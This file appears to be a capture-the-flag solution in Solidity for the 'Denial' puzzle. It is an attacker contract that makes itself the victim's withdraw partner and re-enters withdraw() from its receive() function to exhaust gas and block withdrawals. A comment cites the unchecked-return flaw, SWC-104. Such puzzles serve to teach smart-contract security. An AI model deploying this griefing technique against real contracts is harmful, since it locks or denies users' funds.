// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "./Denial.sol";

contract DenialHack {
    constructor(address payable instanceAddress) {
        Denial(instanceAddress).setWithdrawPartner(address(this));
    }

    // Because the withdraw function is not checking the returned value (this is, in general,
    // a huge bug, see the SWC-104 issue) the flow of the function would continue
    // even if we reverted inside the call execution. How could we force the execution to halt?
    receive() external payable {
        Denial(payable(msg.sender)).withdraw();
    }
}
